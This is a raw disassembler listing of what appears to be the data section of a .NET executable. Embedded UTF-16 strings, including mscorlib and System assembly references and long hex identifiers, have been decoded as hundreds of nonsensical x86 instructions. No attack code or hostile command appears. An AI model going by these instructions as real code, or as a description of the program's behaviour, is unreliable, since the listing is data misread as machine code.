  404338:	add    BYTE PTR ds:0x43003600,dh
  40433e:	add    BYTE PTR [edi],dh
  404340:	add    BYTE PTR [esi],dh
  404342:	add    BYTE PTR [esi+0x0],al
  404345:	cmp    DWORD PTR [eax],eax
  404347:	inc    ebp
  404348:	add    BYTE PTR [eax],bh
  40434a:	add    BYTE PTR [esi],dh
  40434c:	add    BYTE PTR [eax+eax*1],dh
  40434f:	cmp    DWORD PTR [eax],eax
  404351:	xor    eax,DWORD PTR [eax]
  404353:	cmp    BYTE PTR [eax],al
  404355:	xor    eax,DWORD PTR [eax]
  404357:	xor    BYTE PTR [eax],al
  404359:	xor    al,0x0
  40435b:	cmp    DWORD PTR [eax],eax
  40435d:	inc    esi
  40435e:	add    BYTE PTR [ebx],dh
  404360:	add    BYTE PTR [eax],bh
  404362:	add    BYTE PTR [ebx],dh
  404364:	add    BYTE PTR [ebx+0x0],al
  404367:	xor    al,0x0
  404369:	xor    al,0x0
  40436b:	inc    edx
  40436c:	add    BYTE PTR [ebp+0x0],al
  40436f:	xor    BYTE PTR [eax],al
  404371:	inc    ebp
  404372:	add    BYTE PTR [ebx+0x0],al
  404375:	xor    al,BYTE PTR [eax]
  404377:	xor    BYTE PTR [eax],al
  404379:	xor    al,0x0
  40437b:	xor    DWORD PTR [eax],eax
  40437d:	cmp    BYTE PTR [eax],al
  40437f:	xor    DWORD PTR [eax],eax
  404381:	cmp    BYTE PTR [eax],al
  404383:	xor    al,BYTE PTR [eax]
  404385:	xor    al,BYTE PTR [eax]
  404387:	inc    ecx
  404388:	add    BYTE PTR [esi],dh
  40438a:	add    BYTE PTR [ebx+0x0],al
  40438d:	xor    eax,DWORD PTR [eax]
  40438f:	xor    DWORD PTR [eax],eax
  404391:	inc    ebx
  404392:	add    BYTE PTR [esi+0x0],al
  404395:	xor    eax,0x42004500
  40439a:	add    BYTE PTR [edi],dh
  40439c:	add    BYTE PTR [ebp+0x0],al
  40439f:	inc    esi
  4043a0:	add    BYTE PTR [eax+eax*1],dh
  4043a3:	cmp    BYTE PTR [eax],al
  4043a5:	add    BYTE PTR ss:[ecx],bh
  4043a8:	add    BYTE PTR [eax+eax*1],dh
  4043ab:	xor    al,0x0
  4043ad:	inc    esp
  4043ae:	add    BYTE PTR [eax],dh
  4043b0:	add    BYTE PTR [ebx],dh
  4043b2:	add    BYTE PTR [edx],dh
  4043b4:	add    BYTE PTR [ecx],dh
  4043b6:	add    BYTE PTR [eax],bh
  4043b8:	add    BYTE PTR [eax],bh
  4043ba:	add    BYTE PTR [ebp+0x0],al
  4043bd:	inc    ecx
  4043be:	add    BYTE PTR [ecx],dh
  4043c0:	add    BYTE PTR [eax+eax*1+0x33],al
  4043c4:	add    BYTE PTR [ecx],bh
  4043c6:	add    BYTE PTR [edx],dh
  4043c8:	add    BYTE PTR [eax],dh
  4043ca:	add    BYTE PTR [edi],dh
  4043cc:	add    BYTE PTR [esi],dh
  4043ce:	add    BYTE PTR [ebx],dh
  4043d0:	add    BYTE PTR [edi],dh
  4043d2:	add    BYTE PTR [ecx],dh
  4043d4:	add    BYTE PTR [edx],dh
  4043d6:	add    BYTE PTR [ebx+0x0],al
  4043d9:	inc    ebx
  4043da:	add    BYTE PTR [edx+0x0],al
  4043dd:	xor    DWORD PTR [eax],eax
  4043df:	xor    al,BYTE PTR [eax]
  4043e1:	inc    esp
  4043e2:	add    BYTE PTR [edi],dh
  4043e4:	add    BYTE PTR ds:0x42004600,dh
  4043ea:	add    BYTE PTR [edi],dh
  4043ec:	add    BYTE PTR [edi],dh
  4043ee:	add    BYTE PTR [ebp+0x0],al
  4043f1:	cmp    DWORD PTR [eax],eax
  4043f3:	cmp    BYTE PTR [eax],al
  4043f5:	xor    DWORD PTR [eax],eax
  4043f7:	xor    DWORD PTR [eax],eax
  4043f9:	xor    DWORD PTR [eax],eax
  4043fb:	xor    al,0x0
  4043fd:	cmp    DWORD PTR [eax],eax
  4043ff:	inc    ebp
  404400:	add    BYTE PTR [esi],dh
  404402:	add    BYTE PTR [ecx],dh
  404404:	add    BYTE PTR [eax+eax*1],dh
  404407:	cmp    BYTE PTR [eax],al
  404409:	inc    ebp
  40440a:	add    BYTE PTR ds:0x33004400,dh
  404410:	add    BYTE PTR [edx],dh
  404412:	add    BYTE PTR [esi+0x0],al
  404415:	inc    edx
  404416:	add    BYTE PTR [ecx+0x0],al
  404419:	inc    ecx
  40441a:	add    BYTE PTR [edx+0x0],al
  40441d:	xor    eax,DWORD PTR [eax]
  40441f:	aaa    
  404420:	add    BYTE PTR [esi],dh
  404422:	add    BYTE PTR [ecx],dh
  404424:	add    BYTE PTR [ecx],dh
  404426:	add    BYTE PTR [ebx+0x0],al
  404429:	xor    DWORD PTR [eax],eax
  40442b:	cmp    BYTE PTR [eax],al
  40442d:	aaa    
  40442e:	add    BYTE PTR [eax],bh
  404430:	add    BYTE PTR [eax+eax*1+0x44],al
  404434:	add    BYTE PTR [ebx+0x0],al
  404437:	xor    DWORD PTR [eax],eax
  404439:	cmp    DWORD PTR [eax],eax
  40443b:	inc    ebp
  40443c:	add    BYTE PTR [edx],dh
  40443e:	add    BYTE PTR [eax],dh
  404440:	add    BYTE PTR [ebp+0x0],al
  404443:	inc    esi
  404444:	add    BYTE PTR [ecx],dh
  404446:	add    BYTE PTR [ebx],dh
  404448:	add    BYTE PTR ds:0x30004400,dh
  40444e:	add    BYTE PTR [ebx+0x0],al
  404451:	inc    edx
  404452:	add    BYTE PTR [edx],dh
  404454:	add    BYTE PTR [ebx+0x0],al
  404457:	inc    esi
  404458:	add    BYTE PTR [esi+0x0],al
  40445b:	xor    al,BYTE PTR [eax]
  40445d:	inc    edx
  40445e:	add    BYTE PTR [esi+0x0],al
  404461:	inc    ebp
  404462:	add    BYTE PTR [ebx+0x0],al
  404465:	xor    eax,DWORD PTR [eax]
  404467:	inc    esp
  404468:	add    BYTE PTR [ecx],dh
  40446a:	add    BYTE PTR [ecx],dh
  40446c:	add    BYTE PTR ds:0x31003800,dh
  404472:	add    BYTE PTR [eax],dh
  404474:	add    BYTE PTR [ebx+0x0],al
  404477:	xor    eax,DWORD PTR [eax]
  404479:	inc    esp
  40447a:	add    BYTE PTR [ecx],bh
  40447c:	add    BYTE PTR [eax],dh
  40447e:	add    BYTE PTR [esi],dh
  404480:	add    BYTE PTR [ecx],bh
  404482:	add    BYTE PTR [esi],dh
  404484:	add    BYTE PTR [ebx],dh
  404486:	add    BYTE PTR [eax],bh
  404488:	add    BYTE PTR [esi+0x0],al
  40448b:	inc    ebp
  40448c:	add    BYTE PTR [eax+eax*1],dh
  40448f:	inc    edx
  404490:	add    BYTE PTR [ebp+0x0],al
  404493:	xor    al,BYTE PTR [eax]
  404495:	xor    DWORD PTR [eax],eax
  404497:	xor    eax,0x42004400
  40449c:	add    BYTE PTR [esi+0x0],al
  40449f:	aaa    
  4044a0:	add    BYTE PTR [ecx],bh
  4044a2:	add    BYTE PTR ds:0x36003800,dh
  4044a8:	add    BYTE PTR [ecx],dh
  4044aa:	add    BYTE PTR [ecx],bh
  4044ac:	add    BYTE PTR [edx],dh
  4044ae:	add    BYTE PTR [eax],dh
  4044b0:	add    BYTE PTR [ebp+0x0],al
  4044b3:	xor    eax,0x42004100
  4044b8:	add    BYTE PTR [esi],dh
  4044ba:	add    BYTE PTR [esi+0x0],al
  4044bd:	aaa    
  4044be:	add    BYTE PTR [eax+eax*1+0x42],al
  4044c2:	add    BYTE PTR [edx],dh
  4044c4:	add    BYTE PTR [ebp+0x0],al
  4044c7:	xor    al,BYTE PTR [eax]
  4044c9:	inc    ebx
  4044ca:	add    BYTE PTR [ebp+0x0],al
  4044cd:	inc    ebp
  4044ce:	add    BYTE PTR [esi+0x0],al
  4044d1:	xor    DWORD PTR [eax],eax
  4044d3:	xor    eax,DWORD PTR [eax]
  4044d5:	add    BYTE PTR ss:[ecx+0x0],al
  4044d9:	inc    ebx
  4044da:	add    BYTE PTR [edx],dh
  4044dc:	add    BYTE PTR [ebx],dh
  4044de:	add    BYTE PTR [eax+eax*1+0x35],al
  4044e2:	add    BYTE PTR [eax+eax*1+0x44],al
  4044e6:	add    BYTE PTR [edx],dh
  4044e8:	add    BYTE PTR [edx+0x0],al
  4044eb:	inc    esi
  4044ec:	add    BYTE PTR [eax],dh
  4044ee:	add    BYTE PTR [ebx],dh
  4044f0:	add    BYTE PTR [ecx],dh
  4044f2:	add    BYTE PTR [edi],dh
  4044f4:	add    BYTE PTR [eax],dh
  4044f6:	add    BYTE PTR [eax],dh
  4044f8:	add    BYTE PTR [ecx+0x0],al
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx+0x0],al
  4044ff:	xor    al,BYTE PTR [eax]
  404501:	xor    eax,DWORD PTR [eax]
  404503:	xor    al,BYTE PTR [eax]
  404505:	inc    esi
  404506:	add    BYTE PTR [esi],dh
  404508:	add    BYTE PTR [ebx+0x0],al
  40450b:	add    BYTE PTR ss:[edx+0x0],al
  40450f:	xor    DWORD PTR [eax],eax
  404511:	inc    ebx
  404512:	add    BYTE PTR [edi],dh
  404514:	add    BYTE PTR [eax],bh
  404516:	add    BYTE PTR ds:0x34004200,dh
  40451c:	add    BYTE PTR [ebx],dh
  40451e:	add    BYTE PTR [eax],dh
  404520:	add    BYTE PTR ds:0x31004300,dh
  404526:	add    BYTE PTR [edx],dh
  404528:	add    BYTE PTR [ebx],dh
  40452a:	add    BYTE PTR [edx+0x0],al
  40452d:	xor    eax,DWORD PTR [eax]
  40452f:	aaa    
  404530:	add    BYTE PTR [ecx+0x0],al
  404533:	inc    edx
  404534:	add    BYTE PTR [eax+0x73006d96],al
  40453a:	add    BYTE PTR [ebx+0x0],ah
  40453d:	outs   dx,DWORD PTR ds:[esi]
  40453e:	add    BYTE PTR [edx+0x0],dh
  404541:	ins    BYTE PTR es:[edi],dx
  404542:	add    BYTE PTR [ecx+0x0],ch
  404545:	bound  eax,QWORD PTR [eax]
  404547:	sub    al,0x0
  404549:	and    BYTE PTR [eax],al
  40454b:	push   esi
  40454c:	add    BYTE PTR [ebp+0x0],ah
  40454f:	jb     0x404551
  404551:	jae    0x404553
  404553:	imul   eax,DWORD PTR [eax],0x6e006f
  404559:	cmp    eax,0x2e003400
  40455e:	add    BYTE PTR [eax],dh
  404560:	add    BYTE PTR [esi],ch
  404562:	add    BYTE PTR [eax],dh
  404564:	add    BYTE PTR [esi],ch
  404566:	add    BYTE PTR [eax],dh
  404568:	add    BYTE PTR [eax+eax*1],ch
  40456b:	and    BYTE PTR [eax],al
  40456d:	inc    ebx
  40456e:	add    BYTE PTR [ebp+0x0],dh
  404571:	ins    BYTE PTR es:[edi],dx
  404572:	add    BYTE PTR [eax+eax*1+0x75],dh
  404576:	add    BYTE PTR [edx+0x0],dh
  404579:	add    BYTE PTR gs:0x65006e00,bh
  404580:	add    BYTE PTR [ebp+0x0],dh
  404583:	je     0x404585
  404585:	jb     0x404587
  404587:	popa   
  404588:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40458c:	add    BYTE PTR [eax],ah
  40458e:	add    BYTE PTR [eax+0x0],dl
  404591:	jne    0x404593
  404593:	bound  eax,QWORD PTR [eax]
  404595:	ins    BYTE PTR es:[edi],dx
  404596:	add    BYTE PTR [ecx+0x0],ch
  404599:	arpl   WORD PTR [eax],ax
  40459b:	dec    ebx
  40459c:	add    BYTE PTR [ebp+0x0],ah
  40459f:	jns    0x4045a1
  4045a1:	push   esp
  4045a2:	add    BYTE PTR [edi+0x0],ch
  4045a5:	imul   eax,DWORD PTR [eax],0x65
  4045a8:	add    BYTE PTR [esi+0x0],ch
  4045ab:	cmp    eax,0x37006200
  4045b0:	add    BYTE PTR [edi],dh
  4045b2:	add    BYTE PTR [ecx+0x0],ah
  4045b5:	xor    eax,0x35006300
  4045ba:	add    BYTE PTR [esi],dh
  4045bc:	add    BYTE PTR [ecx],dh
  4045be:	add    BYTE PTR [ecx],bh
  4045c0:	add    BYTE PTR [ebx],dh
  4045c2:	add    BYTE PTR [eax+eax*1],dh
  4045c5:	add    BYTE PTR gs:[eax],dh
  4045c8:	add    BYTE PTR [eax],bh
  4045ca:	add    BYTE PTR [ecx],bh
  4045cc:	add    BYTE PTR [eax+0x7900539c],al
  4045d2:	add    BYTE PTR [ebx+0x0],dh
  4045d5:	je     0x4045d7
  4045d7:	add    BYTE PTR gs:[ebp+0x0],ch
  4045db:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  4045e0:	add    BYTE PTR [eax+eax*1+0x61],dh
  4045e4:	add    BYTE PTR [eax+eax*1],ch
  4045e7:	and    BYTE PTR [eax],al
  4045e9:	push   esi
  4045ea:	add    BYTE PTR [ebp+0x0],ah
  4045ed:	jb     0x4045ef
  4045ef:	jae    0x4045f1
  4045f1:	imul   eax,DWORD PTR [eax],0x6e006f
  4045f7:	cmp    eax,0x2e003400
  4045fc:	add    BYTE PTR [eax],dh
  4045fe:	add    BYTE PTR [esi],ch
  404600:	add    BYTE PTR [eax],dh
  404602:	add    BYTE PTR [esi],ch
  404604:	add    BYTE PTR [eax],dh
  404606:	add    BYTE PTR [eax+eax*1],ch
  404609:	and    BYTE PTR [eax],al
  40460b:	inc    ebx
  40460c:	add    BYTE PTR [ebp+0x0],dh
  40460f:	ins    BYTE PTR es:[edi],dx
  404610:	add    BYTE PTR [eax+eax*1+0x75],dh
  404614:	add    BYTE PTR [edx+0x0],dh
  404617:	add    BYTE PTR gs:0x65006e00,bh
  40461e:	add    BYTE PTR [ebp+0x0],dh
  404621:	je     0x404623
  404623:	jb     0x404625
  404625:	popa   
  404626:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40462a:	add    BYTE PTR [eax],ah
  40462c:	add    BYTE PTR [eax+0x0],dl
  40462f:	jne    0x404631
  404631:	bound  eax,QWORD PTR [eax]
  404633:	ins    BYTE PTR es:[edi],dx
  404634:	add    BYTE PTR [ecx+0x0],ch
  404637:	arpl   WORD PTR [eax],ax
  404639:	dec    ebx
  40463a:	add    BYTE PTR [ebp+0x0],ah
  40463d:	jns    0x40463f
  40463f:	push   esp
  404640:	add    BYTE PTR [edi+0x0],ch
  404643:	imul   eax,DWORD PTR [eax],0x65
  404646:	add    BYTE PTR [esi+0x0],ch
  404649:	cmp    eax,0x37006200
  40464e:	add    BYTE PTR [edi],dh
  404650:	add    BYTE PTR [ecx+0x0],ah
  404653:	xor    eax,0x35006300
  404658:	add    BYTE PTR [esi],dh
  40465a:	add    BYTE PTR [ecx],dh
  40465c:	add    BYTE PTR [ecx],bh
  40465e:	add    BYTE PTR [ebx],dh
  404660:	add    BYTE PTR [eax+eax*1],dh
  404663:	add    BYTE PTR gs:[eax],dh
  404666:	add    BYTE PTR [eax],bh
  404668:	add    BYTE PTR [ecx],bh
  40466a:	add    BYTE PTR [eax+0x790053b6],al
  404670:	add    BYTE PTR [ebx+0x0],dh
  404673:	je     0x404675
  404675:	add    BYTE PTR gs:[ebp+0x0],ch
  404679:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  40467e:	add    BYTE PTR [eax+eax*1+0x61],dh
  404682:	add    BYTE PTR [esi],ch
  404684:	add    BYTE PTR [edi+0x0],cl
  404687:	jb     0x404689
  404689:	popa   
  40468a:	add    BYTE PTR [ebx+0x0],ah
  40468d:	ins    BYTE PTR es:[edi],dx
  40468e:	add    BYTE PTR [ebp+0x0],ah
  404691:	inc    ebx
  404692:	add    BYTE PTR [eax+eax*1+0x69],ch
  404696:	add    BYTE PTR [ebp+0x0],ah
  404699:	outs   dx,BYTE PTR ds:[esi]
  40469a:	add    BYTE PTR [eax+eax*1+0x2c],dh
  40469e:	add    BYTE PTR [eax],ah
  4046a0:	add    BYTE PTR [esi+0x0],dl
  4046a3:	add    BYTE PTR gs:[edx+0x0],dh
  4046a7:	jae    0x4046a9
  4046a9:	imul   eax,DWORD PTR [eax],0x6e006f
  4046af:	cmp    eax,0x2e003400
  4046b4:	add    BYTE PTR [eax],dh
  4046b6:	add    BYTE PTR [esi],ch
  4046b8:	add    BYTE PTR [eax],dh
  4046ba:	add    BYTE PTR [esi],ch
  4046bc:	add    BYTE PTR [eax],dh
  4046be:	add    BYTE PTR [eax+eax*1],ch
  4046c1:	and    BYTE PTR [eax],al
  4046c3:	inc    ebx
  4046c4:	add    BYTE PTR [ebp+0x0],dh
  4046c7:	ins    BYTE PTR es:[edi],dx
  4046c8:	add    BYTE PTR [eax+eax*1+0x75],dh
  4046cc:	add    BYTE PTR [edx+0x0],dh
  4046cf:	add    BYTE PTR gs:0x65006e00,bh
  4046d6:	add    BYTE PTR [ebp+0x0],dh
  4046d9:	je     0x4046db
  4046db:	jb     0x4046dd
  4046dd:	popa   
  4046de:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4046e2:	add    BYTE PTR [eax],ah
  4046e4:	add    BYTE PTR [eax+0x0],dl
  4046e7:	jne    0x4046e9
  4046e9:	bound  eax,QWORD PTR [eax]
  4046eb:	ins    BYTE PTR es:[edi],dx
  4046ec:	add    BYTE PTR [ecx+0x0],ch
  4046ef:	arpl   WORD PTR [eax],ax
  4046f1:	dec    ebx
  4046f2:	add    BYTE PTR [ebp+0x0],ah
  4046f5:	jns    0x4046f7
  4046f7:	push   esp
  4046f8:	add    BYTE PTR [edi+0x0],ch
  4046fb:	imul   eax,DWORD PTR [eax],0x65
  4046fe:	add    BYTE PTR [esi+0x0],ch
  404701:	cmp    eax,0x37006200
  404706:	add    BYTE PTR [edi],dh
  404708:	add    BYTE PTR [ecx+0x0],ah
  40470b:	xor    eax,0x35006300
  404710:	add    BYTE PTR [esi],dh
  404712:	add    BYTE PTR [ecx],dh
  404714:	add    BYTE PTR [ecx],bh
  404716:	add    BYTE PTR [ebx],dh
  404718:	add    BYTE PTR [eax+eax*1],dh
  40471b:	add    BYTE PTR gs:[eax],dh
  40471e:	add    BYTE PTR [eax],bh
  404720:	add    BYTE PTR [ecx],bh
  404722:	add    BYTE PTR [eax+0x79005392],al
  404728:	add    BYTE PTR [ebx+0x0],dh
  40472b:	je     0x40472d
  40472d:	add    BYTE PTR gs:[ebp+0x0],ch
  404731:	sub    al,0x0
  404733:	and    BYTE PTR [eax],al
  404735:	push   esi
  404736:	add    BYTE PTR [ebp+0x0],ah
  404739:	jb     0x40473b
  40473b:	jae    0x40473d
  40473d:	imul   eax,DWORD PTR [eax],0x6e006f
  404743:	cmp    eax,0x2e003400
  404748:	add    BYTE PTR [eax],dh
  40474a:	add    BYTE PTR [esi],ch
  40474c:	add    BYTE PTR [eax],dh
  40474e:	add    BYTE PTR [esi],ch
  404750:	add    BYTE PTR [eax],dh
  404752:	add    BYTE PTR [eax+eax*1],ch
  404755:	and    BYTE PTR [eax],al
  404757:	inc    ebx
  404758:	add    BYTE PTR [ebp+0x0],dh
  40475b:	ins    BYTE PTR es:[edi],dx
  40475c:	add    BYTE PTR [eax+eax*1+0x75],dh
  404760:	add    BYTE PTR [edx+0x0],dh
  404763:	add    BYTE PTR gs:0x65006e00,bh
  40476a:	add    BYTE PTR [ebp+0x0],dh
  40476d:	je     0x40476f
  40476f:	jb     0x404771
  404771:	popa   
  404772:	add    BYTE PTR [eax+eax*1+0x2c],ch
  404776:	add    BYTE PTR [eax],ah
  404778:	add    BYTE PTR [eax+0x0],dl
  40477b:	jne    0x40477d
  40477d:	bound  eax,QWORD PTR [eax]
  40477f:	ins    BYTE PTR es:[edi],dx
  404780:	add    BYTE PTR [ecx+0x0],ch
  404783:	arpl   WORD PTR [eax],ax
  404785:	dec    ebx
  404786:	add    BYTE PTR [ebp+0x0],ah
  404789:	jns    0x40478b
  40478b:	push   esp
  40478c:	add    BYTE PTR [edi+0x0],ch
  40478f:	imul   eax,DWORD PTR [eax],0x65
  404792:	add    BYTE PTR [esi+0x0],ch
  404795:	cmp    eax,0x37006200
  40479a:	add    BYTE PTR [edi],dh
  40479c:	add    BYTE PTR [ecx+0x0],ah
  40479f:	xor    eax,0x35006300
  4047a4:	add    BYTE PTR [esi],dh
  4047a6:	add    BYTE PTR [ecx],dh
  4047a8:	add    BYTE PTR [ecx],bh
  4047aa:	add    BYTE PTR [ebx],dh
  4047ac:	add    BYTE PTR [eax+eax*1],dh
  4047af:	add    BYTE PTR gs:[eax],dh
  4047b2:	add    BYTE PTR [eax],bh
  4047b4:	add    BYTE PTR [ecx],bh
  4047b6:	add    BYTE PTR [eax+0x7900539c],al
  4047bc:	add    BYTE PTR [ebx+0x0],dh
  4047bf:	je     0x4047c1
  4047c1:	add    BYTE PTR gs:[ebp+0x0],ch
  4047c5:	add    BYTE PTR cs:[ebx+0x0],al
  4047c9:	outs   dx,DWORD PTR ds:[esi]
  4047ca:	add    BYTE PTR [edx+0x0],dh
  4047cd:	add    BYTE PTR gs:[eax+eax*1],ch
  4047d1:	and    BYTE PTR [eax],al
  4047d3:	push   esi
  4047d4:	add    BYTE PTR [ebp+0x0],ah
  4047d7:	jb     0x4047d9
  4047d9:	jae    0x4047db
  4047db:	imul   eax,DWORD PTR [eax],0x6e006f
  4047e1:	cmp    eax,0x2e003400
  4047e6:	add    BYTE PTR [eax],dh
  4047e8:	add    BYTE PTR [esi],ch
  4047ea:	add    BYTE PTR [eax],dh
  4047ec:	add    BYTE PTR [esi],ch
  4047ee:	add    BYTE PTR [eax],dh
  4047f0:	add    BYTE PTR [eax+eax*1],ch
  4047f3:	and    BYTE PTR [eax],al
  4047f5:	inc    ebx
  4047f6:	add    BYTE PTR [ebp+0x0],dh
  4047f9:	ins    BYTE PTR es:[edi],dx
  4047fa:	add    BYTE PTR [eax+eax*1+0x75],dh
  4047fe:	add    BYTE PTR [edx+0x0],dh
  404801:	add    BYTE PTR gs:0x65006e00,bh
  404808:	add    BYTE PTR [ebp+0x0],dh
  40480b:	je     0x40480d
  40480d:	jb     0x40480f
  40480f:	popa   
  404810:	add    BYTE PTR [eax+eax*1+0x2c],ch
  404814:	add    BYTE PTR [eax],ah
  404816:	add    BYTE PTR [eax+0x0],dl
  404819:	jne    0x40481b
  40481b:	bound  eax,QWORD PTR [eax]
  40481d:	ins    BYTE PTR es:[edi],dx
  40481e:	add    BYTE PTR [ecx+0x0],ch
  404821:	arpl   WORD PTR [eax],ax
  404823:	dec    ebx
  404824:	add    BYTE PTR [ebp+0x0],ah
  404827:	jns    0x404829
  404829:	push   esp
  40482a:	add    BYTE PTR [edi+0x0],ch
  40482d:	imul   eax,DWORD PTR [eax],0x65
  404830:	add    BYTE PTR [esi+0x0],ch
  404833:	cmp    eax,0x37006200
  404838:	add    BYTE PTR [edi],dh
  40483a:	add    BYTE PTR [ecx+0x0],ah
  40483d:	xor    eax,0x35006300
  404842:	add    BYTE PTR [esi],dh
  404844:	add    BYTE PTR [ecx],dh
  404846:	add    BYTE PTR [ecx],bh
  404848:	add    BYTE PTR [ebx],dh
  40484a:	add    BYTE PTR [eax+eax*1],dh
  40484d:	add    BYTE PTR gs:[eax],dh
  404850:	add    BYTE PTR [eax],bh
  404852:	add    BYTE PTR [ecx],bh
  404854:	add    BYTE PTR [eax+0x790053a4],al
  40485a:	add    BYTE PTR [ebx+0x0],dh
  40485d:	je     0x40485f
  40485f:	add    BYTE PTR gs:[ebp+0x0],ch
  404863:	add    BYTE PTR cs:[esi+0x0],cl
  404867:	jne    0x404869
  404869:	ins    DWORD PTR es:[edi],dx
  40486a:	add    BYTE PTR [ebp+0x0],ah
  40486d:	jb     0x40486f
  40486f:	imul   eax,DWORD PTR [eax],0x730063
  404875:	sub    al,0x0
  404877:	and    BYTE PTR [eax],al
  404879:	push   esi
  40487a:	add    BYTE PTR [ebp+0x0],ah
  40487d:	jb     0x40487f
  40487f:	jae    0x404881
  404881:	imul   eax,DWORD PTR [eax],0x6e006f
  404887:	cmp    eax,0x2e003400
  40488c:	add    BYTE PTR [eax],dh
  40488e:	add    BYTE PTR [esi],ch
  404890:	add    BYTE PTR [eax],dh
  404892:	add    BYTE PTR [esi],ch
  404894:	add    BYTE PTR [eax],dh
  404896:	add    BYTE PTR [eax+eax*1],ch
  404899:	and    BYTE PTR [eax],al
  40489b:	inc    ebx
  40489c:	add    BYTE PTR [ebp+0x0],dh
  40489f:	ins    BYTE PTR es:[edi],dx
  4048a0:	add    BYTE PTR [eax+eax*1+0x75],dh
  4048a4:	add    BYTE PTR [edx+0x0],dh
  4048a7:	add    BYTE PTR gs:0x65006e00,bh
  4048ae:	add    BYTE PTR [ebp+0x0],dh
  4048b1:	je     0x4048b3
  4048b3:	jb     0x4048b5
  4048b5:	popa   
  4048b6:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4048ba:	add    BYTE PTR [eax],ah
  4048bc:	add    BYTE PTR [eax+0x0],dl
  4048bf:	jne    0x4048c1
  4048c1:	bound  eax,QWORD PTR [eax]
  4048c3:	ins    BYTE PTR es:[edi],dx
  4048c4:	add    BYTE PTR [ecx+0x0],ch
  4048c7:	arpl   WORD PTR [eax],ax
  4048c9:	dec    ebx
  4048ca:	add    BYTE PTR [ebp+0x0],ah
  4048cd:	jns    0x4048cf
  4048cf:	push   esp
  4048d0:	add    BYTE PTR [edi+0x0],ch
  4048d3:	imul   eax,DWORD PTR [eax],0x65
  4048d6:	add    BYTE PTR [esi+0x0],ch
  4048d9:	cmp    eax,0x37006200
  4048de:	add    BYTE PTR [edi],dh
  4048e0:	add    BYTE PTR [ecx+0x0],ah
  4048e3:	xor    eax,0x35006300
  4048e8:	add    BYTE PTR [esi],dh
  4048ea:	add    BYTE PTR [ecx],dh
  4048ec:	add    BYTE PTR [ecx],bh
  4048ee:	add    BYTE PTR [ebx],dh
  4048f0:	add    BYTE PTR [eax+eax*1],dh
  4048f3:	add    BYTE PTR gs:[eax],dh
  4048f6:	add    BYTE PTR [eax],bh
  4048f8:	add    BYTE PTR [ecx],bh
  4048fa:	add    BYTE PTR [eax+0x790053b4],al
  404900:	add    BYTE PTR [ebx+0x0],dh
  404903:	je     0x404905
  404905:	add    BYTE PTR gs:[ebp+0x0],ch
  404909:	add    BYTE PTR cs:[edx+0x0],dl
  40490d:	jne    0x40490f
  40490f:	outs   dx,BYTE PTR ds:[esi]
  404910:	add    BYTE PTR [eax+eax*1+0x69],dh
  404914:	add    BYTE PTR [ebp+0x0],ch
  404917:	add    BYTE PTR gs:[esi],ch
  40491a:	add    BYTE PTR [edx+0x0],dl
  40491d:	add    BYTE PTR gs:[ebp+0x0],ch
  404921:	outs   dx,DWORD PTR ds:[esi]
  404922:	add    BYTE PTR [eax+eax*1+0x69],dh
  404926:	add    BYTE PTR [esi+0x0],ch
  404929:	add    BYTE PTR [si],ch
  40492c:	add    BYTE PTR [eax],ah
  40492e:	add    BYTE PTR [esi+0x0],dl
  404931:	add    BYTE PTR gs:[edx+0x0],dh
  404935:	jae    0x404937
  404937:	imul   eax,DWORD PTR [eax],0x6e006f
  40493d:	cmp    eax,0x2e003400
  404942:	add    BYTE PTR [eax],dh
  404944:	add    BYTE PTR [esi],ch
  404946:	add    BYTE PTR [eax],dh
  404948:	add    BYTE PTR [esi],ch
  40494a:	add    BYTE PTR [eax],dh
  40494c:	add    BYTE PTR [eax+eax*1],ch
  40494f:	and    BYTE PTR [eax],al
  404951:	inc    ebx
  404952:	add    BYTE PTR [ebp+0x0],dh
  404955:	ins    BYTE PTR es:[edi],dx
  404956:	add    BYTE PTR [eax+eax*1+0x75],dh
  40495a:	add    BYTE PTR [edx+0x0],dh
  40495d:	add    BYTE PTR gs:0x65006e00,bh
  404964:	add    BYTE PTR [ebp+0x0],dh
  404967:	je     0x404969
  404969:	jb     0x40496b
  40496b:	popa   
  40496c:	add    BYTE PTR [eax+eax*1+0x2c],ch
  404970:	add    BYTE PTR [eax],ah
  404972:	add    BYTE PTR [eax+0x0],dl
  404975:	jne    0x404977
  404977:	bound  eax,QWORD PTR [eax]
  404979:	ins    BYTE PTR es:[edi],dx
  40497a:	add    BYTE PTR [ecx+0x0],ch
  40497d:	arpl   WORD PTR [eax],ax
  40497f:	dec    ebx
  404980:	add    BYTE PTR [ebp+0x0],ah
  404983:	jns    0x404985
  404985:	push   esp
  404986:	add    BYTE PTR [edi+0x0],ch
  404989:	imul   eax,DWORD PTR [eax],0x65
  40498c:	add    BYTE PTR [esi+0x0],ch
  40498f:	cmp    eax,0x37006200
  404994:	add    BYTE PTR [edi],dh
  404996:	add    BYTE PTR [ecx+0x0],ah
  404999:	xor    eax,0x35006300
  40499e:	add    BYTE PTR [esi],dh
  4049a0:	add    BYTE PTR [ecx],dh
  4049a2:	add    BYTE PTR [ecx],bh
  4049a4:	add    BYTE PTR [ebx],dh
  4049a6:	add    BYTE PTR [eax+eax*1],dh
  4049a9:	add    BYTE PTR gs:[eax],dh
  4049ac:	add    BYTE PTR [eax],bh
  4049ae:	add    BYTE PTR [ecx],bh
  4049b0:	add    BYTE PTR [eax+0x790053c4],al
  4049b6:	add    BYTE PTR [ebx+0x0],dh
  4049b9:	je     0x4049bb
  4049bb:	add    BYTE PTR gs:[ebp+0x0],ch
  4049bf:	add    BYTE PTR cs:[eax+eax*1+0x68],dl
  4049c4:	add    BYTE PTR [edx+0x0],dh
  4049c7:	add    BYTE PTR gs:[ecx+0x0],ah
  4049cb:	add    BYTE PTR fs:[ecx+0x0],ch
  4049cf:	outs   dx,BYTE PTR ds:[esi]
  4049d0:	add    BYTE PTR [edi+0x0],ah
  4049d3:	add    BYTE PTR cs:[eax+eax*1+0x61],dl
  4049d8:	add    BYTE PTR [ebx+0x0],dh
  4049db:	imul   eax,DWORD PTR [eax],0x73
  4049de:	add    BYTE PTR [esi],ch
  4049e0:	add    BYTE PTR [eax+eax*1+0x61],al
  4049e4:	add    BYTE PTR [eax+eax*1+0x61],dh
  4049e8:	add    BYTE PTR [esi+0x0],ah
